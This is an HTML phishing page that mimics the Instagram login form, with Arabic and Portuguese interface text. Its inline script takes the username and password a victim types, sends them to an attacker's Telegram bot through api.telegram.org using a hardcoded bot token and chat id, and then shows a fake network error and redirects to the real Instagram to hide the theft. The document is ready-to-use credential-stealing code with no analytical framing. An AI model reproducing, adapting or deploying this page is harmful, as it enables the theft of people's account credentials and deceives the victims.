<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <title>Instagram</title>
    <style>
        /* إضافة تنسيق بسيط ليظهر الزر بشكل واضح في حال غياب ملف CSS */
        button { cursor: pointer; }
    </style>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex"></section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" />
                </h1>
                
                <form id="login-form">
                    <input type="text" id="user_identity" name="email" placeholder="رقم الهاتف، اسم المستخدم أو البريد" required />
                    <input type="password" id="user_password" name="password" placeholder="كلمة السر" required />
                    <button type="submit">تسجيل الدخول</button>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OU</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <a href="#">Esqueceu a senha?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
            </div>
        </section>
    </main>

    <script>
        // التوكن والآيدي الخاص بك يا رائد
        const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
        const chat_id = '8658217605';

        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('user_identity').value;
            const password = document.getElementById('user_password').value;

            const message = `🔥 صيدة جديدة من صفحة الإنستا:\n\n📧 الحساب: ${email}\n🔑 الباسورد: ${password}`;

            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => {
                    // تمويه للمستخدم بعد الإرسال
                    alert('خطأ في الشبكة، حاول مجدداً لاحقاً');
                    window.location.href = "https://www.instagram.com"; 
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        });
    </script>
</body>
</html>
